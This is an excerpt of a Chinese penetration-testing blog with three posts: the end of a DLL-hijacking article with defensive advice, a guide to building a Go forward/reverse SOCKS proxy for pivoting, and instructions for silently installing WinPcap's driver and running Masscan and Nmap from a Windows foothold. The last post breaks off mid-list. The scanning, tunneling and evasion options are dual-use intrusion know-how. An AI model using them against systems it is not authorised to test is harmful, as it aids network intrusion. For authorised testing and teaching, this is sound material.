<p><strong>自动化程序测试：</strong></p>

<p>如图，得出存在劫持漏洞的dll列表</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-12-7/3-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在反复启动进程的过程中，calc.exe正常被关闭，所以得出的结果准确
</code></pre></div></div>

<h2 id="0x06-防御">0x06 防御</h2>
<hr>

<h3 id="1开发者需要注意的问题">1、开发者需要注意的问题：</h3>

<ul>
  <li>调用第三方DLL时，使用LoadLibrary API加载DLL时使用绝对路径，类似的情况还包括其他API如LoadLibraryEx, CreateProcess, ShellExecute等，将所有需要使用到的DLL放在应用程序所在的目录，不放到系统目录或者其他目录</li>
  <li>调用系统DLL时，使用绝对路径</li>
  <li>程序启动时调用API SetDllDirectory(L”“)将当前目录从DLL加载顺序中移除</li>
</ul>

<p><strong>补充：</strong></p>

<p>从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题</p>

<p>但是这些API只能在打了KB2533623补丁的Windows7和Server2008上使用</p>

<p>详情见：</p>

<p>https://support.microsoft.com/zh-cn/kb/2533623</p>

<h3 id="2用户需要注意的问题">2、用户需要注意的问题：</h3>

<ul>
  <li>留意浏览器下载目录下是否有可疑dll，防止其劫持下载的安装程序</li>
  <li>对于“不可信”的程序，建议使用Process Monitor或者Rattler检查是否存在DLL劫持漏洞</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>我在对DLL劫持漏洞原理的研究过程中，走了一小段弯路，某些资料提到</p>

<blockquote>
  <p>如果进程尝试加载的DLL并不存在，那么进程仍然会尝试去当前目录加载这个DLL，这是SafeDllSearchMode所无法防范的。</p>
</blockquote>

<p>这让我产生了如下疑问：</p>

<ol>
  <li>
    <p>这里提到的“并不存在的DLL”究竟是指哪些dll?系统不存在的dll?但CRYPTSP.dll却是系统默认的包含的dll</p>
  </li>
  <li>
    <p>“SafeDllSearchMode所无法防范的”DLL劫持到底是指什么?难道DLL劫持还有多种?有几种?</p>
  </li>
</ol>

<p>好在最终解决了这些问题，希望本文也能帮助有同样疑惑的人</p>

<p>利用DLL劫持漏洞自动化识别工具Rattler对常用工具进行测试，能很快找出存在的漏洞位置，高效，方便，值得测试使用</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on December  7, 2016
  </div>

  
</article><article class="post">
  <h1>渗透基础——使用Go语言开发socks代理工具</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">《渗透基础——端口转发与代理》</a>提到了使用go语言分别实现正向和反向socks代理的方法，不仅开发效率高，而且能够很方便的实现跨平台编译。
本文将要进一步介绍Windows系统和Kali系统下使用Go语言开发的完整过程，并基于开源代码，实现一个socks正向和反向代理的工具，记录细节。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows系统下Go语言开发环境的搭建</li>
  <li>Kali系统下Go语言开发环境的搭建</li>
  <li>工具代码细节</li>
  <li>开源完整实现代码</li>
</ul>

<h2 id="0x02-windows系统下go语言开发环境的搭建">0x02 Windows系统下Go语言开发环境的搭建</h2>
<hr>

<p>测试系统： Win7x64</p>

<h3 id="1安装go">1、安装Go</h3>

<p>下载安装：</p>

<p>https://golang.org/dl</p>

<p>或者</p>

<p>https://studygolang.com/dl</p>

<h3 id="2安装git">2、安装git</h3>

<p>https://gitforwindows.org/</p>

<p>用来下载第三方开发包</p>

<h2 id="0x03-代码实现与windows系统下的跨平台编译">0x03 代码实现与Windows系统下的跨平台编译</h2>
<hr>

<h3 id="1安装第三方包">1、安装第三方包</h3>

<p>需要以下三个：</p>

<ul>
  <li>golang.org/x/net/context</li>
  <li>https://github.com/armon/go-socks5</li>
  <li>https://github.com/hashicorp/yamux</li>
</ul>

<p>安装流程如下：</p>

<h4 id="1安装golangorgxnetcontext">(1)安装golang.org/x/net/context</h4>

<p>go-socks5依赖，否则安装时会提示：</p>

<blockquote>
  <p>go\src\github.com\armon\go-socks5\request.go:10:2: cannot find package
“golang.o rg/x/net/context” in any of:
        C:\Go\src\golang.org\x\net\context (from $GOROOT )
        C:\Users\a\go\src\golang.org\x\net\context (from $GOPATH)</p>
</blockquote>

<p>在线安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go get golang.org/x/net/context
</code></pre></div></div>

<p>通常会失败，这里可以先从github下载再离线安装</p>

<p>完整命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md %GOROOT%\src\golang.org\x
cd %GOROOT%\src\golang.org\x
git clone https://github.com/golang/net.git
go install golang.org/x/net/context
</code></pre></div></div>

<p>注意这里使用的路径为GOROOT，默认路径为<code class="language-plaintext highlighter-rouge">C:\Go</code>，可通过输入<code class="language-plaintext highlighter-rouge">go env</code>查看</p>

<h4 id="2安装go-socks5">(2)安装go-socks5</h4>

<p>在线安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go get github.com/armon/go-socks5
</code></pre></div></div>

<p>如果安装失败，同样先从github下载再离线安装</p>

<p>完整命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md %USERPROFILE%\go\src\
cd %USERPROFILE%\go\src\
git clone https://github.com/armon/go-socks5.git
go install go-socks5
</code></pre></div></div>

<p>需要注意这里使用的路径为<code class="language-plaintext highlighter-rouge">%USERPROFILE%\go\</code>，即GOPATH，而不是GOROOT，可通过输入<code class="language-plaintext highlighter-rouge">go env</code>查看</p>

<p>如果使用GOROOT，会出现如下错误：</p>

<blockquote>
  <p>can’t load package: C:\Go\src\go-socks5\request.go:10:2: non-standard
import “go lang.org/x/net/context” in standard package “go-socks5”</p>
</blockquote>

<h4 id="3安装yamux">(3)安装yamux</h4>

<p>在线安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go get github.com/hashicorp/yamux
</code></pre></div></div>

<p>离线安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd %GOROOT%\src\
git clone https://github.com/hashicorp/yamux
go install yamux
</code></pre></div></div>

<h3 id="2实现代码">2、实现代码</h3>

<p>我这里参考了https://github.com/brimstone/rsocks</p>

<p>添加了正向代理的功能，并在结构上做了调整，区分正向和反向代理</p>

<p>完整实现代码：</p>

<p>https://github.com/3gstudent/Homework-of-Go/blob/master/frsocks.go</p>

<h3 id="3跨平台编译">3、跨平台编译</h3>

<p>正常编译命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build frsocks.go
</code></pre></div></div>

<p>编译成功后生成文件frsocks.exe</p>

<p>想要指定输出文件名，这里需要先将frsocks.go重命名为main.go，再分别使用以下代码进行跨平台编译</p>

<h4 id="1windows-32位">(1)Windows 32位</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET CGO_ENABLED=0
SET GOOS=windows
SET GOARCH=386
go build -o frsocks_windows_386
</code></pre></div></div>

<h4 id="2windows-64位">(2)Windows 64位</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET CGO_ENABLED=0
SET GOOS=windows
SET GOARCH=amd64
go build -o frsocks_windows_adm64
</code></pre></div></div>

<h4 id="3linux-arm64">(3)linux arm64</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET CGO_ENABLED=0
SET GOOS=linux
SET GOARCH=amd64
go build -o frsocks_linux_amd64
</code></pre></div></div>

<p>所有支持的系统如下：</p>

<ul>
  <li>android	arm</li>
  <li>darwin	386</li>
  <li>darwin	amd64</li>
  <li>darwin	arm</li>
  <li>darwin	arm64</li>
  <li>dragonfly	amd64</li>
  <li>freebsd	386</li>
  <li>freebsd	amd64</li>
  <li>freebsd	arm</li>
  <li>linux	386</li>
  <li>linux	amd64</li>
  <li>linux	arm</li>
  <li>linux	arm64</li>
  <li>linux	ppc64</li>
  <li>linux	ppc64le</li>
  <li>linux	mips</li>
  <li>linux	mipsle</li>
  <li>linux	mips64</li>
  <li>linux	mips64le</li>
  <li>linux	s390x</li>
  <li>netbsd	386</li>
  <li>netbsd	amd64</li>
  <li>netbsd	arm</li>
  <li>openbsd	386</li>
  <li>openbsd	amd64</li>
  <li>openbsd	arm</li>
  <li>plan9	386</li>
  <li>plan9	amd64</li>
  <li>solaris	amd64</li>
  <li>windows	386</li>
  <li>windows	amd64</li>
</ul>

<p>来自https://golang.org/doc/install/source#environment</p>

<h2 id="0x04-kali系统下go语言开发环境的搭建">0x04 Kali系统下Go语言开发环境的搭建</h2>
<hr>

<p>测试系统： Kali2</p>

<h3 id="1安装go-1">1、安装Go</h3>

<p>下载：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://dl.google.com/go/go1.11.2.linux-amd64.tar.gz
</code></pre></div></div>

<p>或者</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://studygolang.com/dl/golang/go1.11.linux-amd64.tar.gz
</code></pre></div></div>

<p>安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar -xzf go1.11.linux-amd64.tar.gz -C /usr/local
</code></pre></div></div>

<p>测试：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/local/go
echo 'export PATH=$PATH:/usr/local/go/bin' &gt;&gt; /etc/profile
source /etc/profile
go
</code></pre></div></div>

<h2 id="0x05-代码实现与kali系统下的跨平台编译">0x05 代码实现与Kali系统下的跨平台编译</h2>
<hr>

<h3 id="1安装第三方包-1">1、安装第三方包</h3>

<p>需要以下三个：</p>

<ul>
  <li>golang.org/x/net/context</li>
  <li>https://github.com/armon/go-socks5</li>
  <li>https://github.com/hashicorp/yamux</li>
</ul>

<h4 id="1安装golangorgxnetcontext-1">(1)安装golang.org/x/net/context</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /usr/local/go/src/golang.org/
mkdir /usr/local/go/src/golang.org/x
cd /usr/local/go/src/golang.org/x
git clone https://github.com/golang/net.git
go install golang.org/x/net/context
</code></pre></div></div>

<h4 id="2安装go-socks5-1">(2)安装go-socks5</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir /root/go
mkdir /root/go/src
cd /root/go/src
git clone https://github.com/armon/go-socks5.git
go install go-socks5
</code></pre></div></div>

<h4 id="3安装yamux-1">(3)安装yamux</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/local/go/src/
git clone https://github.com/hashicorp/yamux
go install yamux
</code></pre></div></div>

<h3 id="2实现代码-1">2、实现代码</h3>

<p>https://github.com/3gstudent/Homework-of-Go/blob/master/frsocks.go</p>

<h3 id="3跨平台编译-1">3、跨平台编译</h3>

<p>正常编译命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build frsocks.go
</code></pre></div></div>

<p>编译成功后生成文件frsocks</p>

<p>想要指定输出文件名，这里需要先将frsocks.go重命名为main.go，再分别使用以下代码进行跨平台编译</p>

<h4 id="1windows-32位-1">(1)Windows 32位</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -o frsocks_windows_386.exe
</code></pre></div></div>

<h4 id="2windows-64位-1">(2)Windows 64位</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o frsocks_windows_amd64.exe
</code></pre></div></div>

<h4 id="3linux-arm64-1">(3)linux arm64</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o frsocks_linux_amd64
</code></pre></div></div>

<p>其它环境见https://golang.org/doc/install/source#environment</p>

<p>实现全平台编译的批处理文件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Go/blob/master/windows_build.bat</p>

<h2 id="0x06-工具测试">0x06 工具测试</h2>
<hr>

<h3 id="1正向代理">1、正向代理</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/3-2.png" alt="Alt text"></p>

<p>Client：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frsocks -sockstype fsocks -listen 1080
</code></pre></div></div>

<p>使用代理工具连接Client的1080端口</p>

<h3 id="2反向代理">2、反向代理</h3>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-10-7/3-3.png" alt="Alt text"></p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frsocks -sockstype rsocks -listen 1111 -socks 127.0.0.1:2222
</code></pre></div></div>

<p>Transit server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frsocks -sockstype rsocks -connect 1.1.1.1:1111
</code></pre></div></div>

<p>使用代理工具连接Client的2222端口</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Windows系统和Kali系统下使用Go语言开发的完整过程，基于开源代码，实现了一个socks正向和反向代理的工具。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 22, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Windows平台运行Masscan和Nmap</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在内网渗透中，信息搜集尤为重要。
面对内网的复杂环境，虽说网络扫描容易暴露自己，但通过扫描可以发现内网的存活主机、开放端口，运行服务、操作系统等信息，为进一步渗透奠定基础。
扫描工具的选取，不仅要考虑功能，更要考虑工具的适用性。
现实中的跳板通常并不是一台Linux服务器，没有合适的环境安装Nmap、Zmap和Masscan。
换句话说，可在Windows下直接使用的命令行扫描工具有哪些呢？
知名的开源扫描工具Nmap、Zmap和Masscan，三款工具在功能上各有特色。
在适用性上，Zmap在Windows下使用需要安装Cygwin，因此不在考虑范围内。
Masscan支持Windows平台的编译，Nmap提供命令行版本，看起来Masscan和Nmap符合要求。
但是，Masscan和Nmap的使用均需要WinPcap的支持，也就是说，使用前均需要安装WinPcap。
那么，能否通过命令行安装WinPcap呢？</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要要解决以上问题，介绍内容如下：</p>

<ul>
  <li>Windows平台编译Masscan</li>
  <li>Windows命令行安装WinPcap</li>
  <li>Masscan使用介绍</li>
  <li>Nmap配置和使用介绍</li>
</ul>

<h2 id="0x02-windows平台编译masscan">0x02 Windows平台编译Masscan</h2>
<hr>

<p><strong>Masscan下载地址：</strong></p>

<p>https://github.com/robertdavidgraham/masscan/</p>

<p>编译工具：<code class="language-plaintext highlighter-rouge">vs2012</code></p>

<p>编译选项中未添加vs2012的编译配置，所以直接编译会报错</p>

<p><strong>解决方法：</strong></p>

<p>在string_s.h中添加vs2012配置信息</p>

<p>位于misc-string_s.h,添加代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#if defined(_MSC_VER) &amp;&amp; (_MSC_VER == 1700)
/*Visual Studio 2012*/
# include &lt;stdio.h&gt;
# include &lt;string.h&gt;
# define strcasecmp     _stricmp
# define memcasecmp     _memicmp
# ifndef PRIu64
#  define PRIu64 "llu"
#  define PRId64 "lld"
#  define PRIx64 "llx"
# endif
</code></pre></div></div>

<p>编译成功，执行masscan.exe，提示<code class="language-plaintext highlighter-rouge">Packet.dll: not found</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-1.png" alt="Alt text"></p>

<p><strong>Packet.dll获取方法：</strong></p>

<p>安装WinPcap后在System32下获得</p>

<p><strong>WinPcap下载地址：</strong></p>

<p>https://www.winpcap.org/install/default.htm</p>

<p>在另一系统安装WinPcap，在System32下找到Packet.dll和Wpcap.dll，复制到测试系统下masscan.exe的同级目录，再次运行</p>

<p>程序正常启动，但是无法扫描，报错如下：</p>

<p><code class="language-plaintext highlighter-rouge">FAIL: Error opening adapter: 系统找不到指定的设备。 (20)
adapter[\Device\NPF_{71D19B82-0818-4685-A8E7-A6C7C812F2EA}].init: failed</code></p>

<p><strong>疑问：测试系统也需要安装WinPcap才能使用？</strong></p>

<p>经实际测试，确实如此</p>

<h2 id="0x03-windows命令行安装winpcap">0x03 Windows命令行安装WinPcap</h2>
<hr>

<h3 id="测试32位系统">测试32位系统：</h3>

<p>使用ProcessMonitor监控WinPcap安装过程（32位系统），获得如下信息：</p>

<ul>
  <li>在\system32\文件夹下释放packet.dll和wpcap.dll</li>
  <li>在\system32\drivers\释放npf.sys</li>
  <li>安装服务npf</li>
</ul>

<p>通过sc命令获得安装服务npf的配置信息：</p>

<p><code class="language-plaintext highlighter-rouge">sc qc npf</code></p>

<p>获取信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[SC] QueryServiceConfig 成功

SERVICE_NAME: npf
        TYPE               : 1  KERNEL_DRIVER
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : system32\drivers\npf.sys
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : NetGroup Packet Filter Driver
        DEPENDENCIES       :
        SERVICE_START_NAME :
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-2.png" alt="Alt text"></p>

<p>查看运行状态：</p>

<p><code class="language-plaintext highlighter-rouge">sc query npf</code></p>

<p>获取信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SERVICE_NAME: npf
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-3.png" alt="Alt text"></p>

<p>对应的注册表会创建键值，表示服务配置信息，位置如下：</p>

<ul>
  <li>HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\npf</li>
  <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\npf</li>
</ul>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-4.png" alt="Alt text"></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-5.png" alt="Alt text"></p>

<p>猜测，只要能够模拟上述安装操作,就能够实现WinPcap在命令行下的安装</p>

<p><strong>模拟安装操作如下：</strong></p>

<p><strong>1、释放文件</strong></p>

<p><code class="language-plaintext highlighter-rouge">
copy packet.dll %SystemRoot%\system32\
copy wpcap.dll %SystemRoot%\system32\ 
copy npf.sys %SystemRoot%\system32\drivers\</code></p>

<p><strong>2、创建服务</strong></p>

<p><code class="language-plaintext highlighter-rouge">
sc create npf binPath= system32\drivers\npf.sys type= kernel start= demand error= normal tag= no DisplayName= "NetGroup Packet Filter Driver"</code></p>

<p><strong>3、启动服务</strong></p>

<p><code class="language-plaintext highlighter-rouge">sc start npf</code></p>

<p>测试命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p80 192.168.81.143</code></p>

<p>成功执行masscan.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/2-6.png" alt="Alt text"></p>

<h3 id="测试64位系统">测试64位系统：</h3>

<p>使用ProcessMonitor监控WinPcap安装过程（32位系统），获得如下信息：</p>

<ul>
  <li>在\system32\文件夹下释放64位packet.dll和wpcap.dll</li>
  <li>在\system32\drivers\释放64位npf.sys</li>
  <li>在\syswow64\文件夹下释放32位packet.dll、wpcap.dll和pthreadVC.dll</li>
  <li>安装服务npf</li>
</ul>

<p>经实际测试和优化，在64位环境下执行32位的masscan.exe，不需要64位的packet.dll和wpcap.dll，不需要32位的pthreadVC.dll，仅需要安装64位驱动npf.sys</p>

<p>并且，无论是32位还是64位系统，packet.dll和wpcap.dll放在masscan.exe同级目录即可（当然，由于是vs2012编译，还需要msvcr110d.dll）</p>

<p>也就是说，针对32位和64位系统，只需要向\system32\drivers\文件夹复制不同版本的npf.sys即可</p>

<p>接着创建服务npf并安装，整个流程结束</p>

<p>将以上过程通过批处理自动实现，一键安装脚本代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo off
cd %~dp0
if "%PROCESSOR_ARCHITECTURE%"=="x86" move npf_x86.sys %SystemRoot%\system32\drivers\npf.sys
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" move npf_x64.sys %SystemRoot%\system32\drivers\npf.sys
if exist %SystemRoot%\system32\drivers\npf.sys (echo move success!) else (echo move error!)
sc create npf binPath= system32\drivers\npf.sys type= kernel start= demand error= normal tag= no DisplayName= "NetGroup Packet Filter Driver"
sc start npf
</code></pre></div></div>

<p>相关代码和所需dll文件已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Winpcap_Install</p>

<h2 id="0x04-masscan使用介绍">0x04 Masscan使用介绍</h2>
<hr>

<p>扫描指定网段和端口：</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p80 192.168.81.1/24</code></p>

<p>找到一台开启80端口的服务器，回显如下：</p>

<p><code class="language-plaintext highlighter-rouge">Discovered open port 80/tcp on 192.168.81.143</code></p>

<p>扫描指定主机所有开放的端口：</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p0-65535 192.168.81.143</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/3-1.png" alt="Alt text"></p>

<p>扫描指定主机的特定端口：</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p80,443 192.168.81.143</code></p>

<p>获取banner：</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p80,443,3306 192.168.81.143 --banners</code></p>

<p>通过配置文件启动扫描：</p>

<p>将配置信息保存在1.conf:</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf</code></p>

<p>读取配置信息1.conf，启动扫描:</p>

<p><code class="language-plaintext highlighter-rouge">masscan.exe -c 1.conf</code></p>

<p>修改扫描速度为100,000包/秒（Windos下最大为 300,000包/秒），默认100包/秒：</p>

<p><code class="language-plaintext highlighter-rouge">--rate 100000</code></p>

<p>输出格式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-oX &lt;filespec&gt; (XML)
-oB &lt;filespec&gt; (Binary)
-oG &lt;filespec&gt; (Grep)
-oJ &lt;filespec&gt; (Json)
-oL &lt;filespec&gt; (List)
-oU &lt;filespec&gt; (Unicornscan format)
</code></pre></div></div>

<p>补充，默认情况，masscan开启如下配置：</p>

<p><code class="language-plaintext highlighter-rouge">
-sS: this does SYN scan only (currently, will change in the future)
-Pn: doesn't ping hosts first, which is fundamental to the async operation
-n: no DNS resolution happens
--randomize-hosts: scan completely randomized
--send-eth: sends using raw libpcap</code></p>

<h2 id="0x05-nmap配置和使用介绍">0x05 Nmap配置和使用介绍</h2>
<hr>

<p><strong>NmapZip版下载地址：</strong></p>

<p>https://nmap.org/dist/nmap-7.50-win32.zip</p>

<p>使用Nmap也要在命令行提前安装WinPcap</p>

<p>还要添加vs2013的dll：msvcp120.dll和msvcr120.dll(Nmap.exe通过vs2013编译)</p>

<p>去掉不相关文件，精简nmap,最终需要的支持文件列表如下：</p>

<ul>
  <li>libeay32.dll</li>
  <li>msvcp120.dll</li>
  <li>msvcr120.dll</li>
  <li>nmap-mac-prefixes</li>
  <li>nmap-os-db</li>
  <li>nmap-payloads</li>
  <li>nmap-services</li>
  <li>nmap.exe</li>
  <li>ssleay32.dll</li>
</ul>

<p>扫描指定网段和端口：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -p80 192.168.81.1-255</code></p>

<p>或者</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -p80 192.168.81.1/24</code></p>

<p>扫描IP地址列表：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe iL IP.txt</code></p>

<p>扫描指定主机所有开放的端口：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe 192.168.81.143</code></p>

<p>扫描指定主机的特定端口：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -p80,443 192.168.81.143</code></p>

<p>操作系统探测(-O)：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -O 192.168.81.143</code></p>

<p>端口上运行的服务版本探测(-sV)：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -sV 192.168.81.143</code></p>

<p>端口扫描如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/4-1.png" alt="Alt text"></p>

<p>版本检测如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-5/4-2.png" alt="Alt text"></p>

<p>通过对比可知版本检测能够识别端口上的服务版本</p>

<p><strong>注：</strong></p>

<p>恢复版本检测(-sV)需要添加以下文件：</p>
<ul>
  <li>nse_main.lua</li>
  <li>nmap-service-probes</li>
  <li>nselib文件夹及文件夹内的文件</li>
  <li>scripts文件夹及文件夹内的文件</li>
</ul>

<p>路由信息探测(–traceroute)</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe --traceroute 192.168.81.143</code></p>

<p>综合探测（-A）</p>

<p>包括操作系统、服务版本和路由信息，也就是以上三者的集合</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -A 192.168.81.143</code></p>

<p>扫描方式支持如下参数：</p>

<p><code class="language-plaintext highlighter-rouge">
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &lt;FTP relay host&gt;: FTP bounce scan
</code></p>

<h3 id="常用扫描方式介绍">常用扫描方式介绍：</h3>

<p>TCP SYN Scan(-sS)</p>

<ul>
  <li>半开放扫描(half-open scanning)，没有建立三次握手连接，速度很快</li>
  <li>nmap默认扫描方式</li>
</ul>

<p>TCP connect scan(-sT)</p>

<ul>
  <li>完成三次握手过程（SYN，SYN/ACK，ACK），当然，速度会降低</li>
  <li>容易被检测</li>
</ul>

<p>Udp scan(-sU)</p>

<ul>
  <li>扫描UDP端口</li>
</ul>

<p>TCP Null/FIN/Xmas scan(-sN/-sF/-sX)</p>

<ul>
  <li>用来判断端口是否开放</li>
  <li>能够绕过一些无状态防火墙</li>
</ul>

<p>Null scan (-sN)</p>

<ul>
  <li>不设置任何标志位(tcp标志头是0)</li>
</ul>

<p>FIN scan (-sF)</p>

<ul>
  <li>只设置TCP FIN标志位</li>
</ul>

<p>Xmas scan (-sX)</p>

<ul>
  <li>设置FIN，PSH，和URG标志位</li>
</ul>

<p>TCP ACK scan(-sA)</p>

<ul>
  <li>不用于确定端口是否开放</li>
  <li>用于发现防火墙规则，确定防火墙规则是有状态的还是无状态的，哪些端口是被过滤的</li>
  <li>只设置ACK标志位</li>
</ul>

<p>Custom TCP scan(–scanflags)</p>

<ul>
  <li>手动指定任意TCP标志位来设计自定义扫描</li>
  <li>可用于绕过入侵检测系统</li>
  <li>需要对通信协议有深入的理解</li>
</ul>

<p>Idle scan(-sI)</p>

<ul>
  <li>伪造扫描源地址</li>
</ul>

<p><strong>注：</strong></p>

<p>该源地址主机必须在线</p>

<p>也可伪造源端口，默认为80端口</p>

<p>伪造源端口格式如下：</p>

<p><code class="language-plaintext highlighter-rouge"> &lt;zombie host[:probeport]&gt;</code></p>

<p>实例：</p>

<p><code class="language-plaintext highlighter-rouge">nmap.exe -sI 192.168.81.1：1234 192.168.81.143</code></p>

<p>PING Scan(-sP)</p>

<ul>
  <li>使用ping来扫描主机是否在线</li>
</ul>

<p>No PING Scan(-PN)</p>

<ul>
  <li>不用ping进行扫描</li>
</ul>

<p><strong>注：</strong></p>

<p>PN两个字母大写</p>

<p>输出格式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-oN &lt;filespec&gt; (标准)
-oX &lt;filespec&gt; (XML)
-oS &lt;filespec&gt; (ScRipT KIdd|3 oUTpuT)
nmap默认输出均为大写格式，使用-oS会随机改写字母大小写
-oG &lt;filespec&gt; (Grep)
-oA &lt;basename&gt; (输出至所有格式)
设置文件名称，一次性输出标准(.nmap)、XML(.xml)和Grep(.gnmap)三种格式的文件
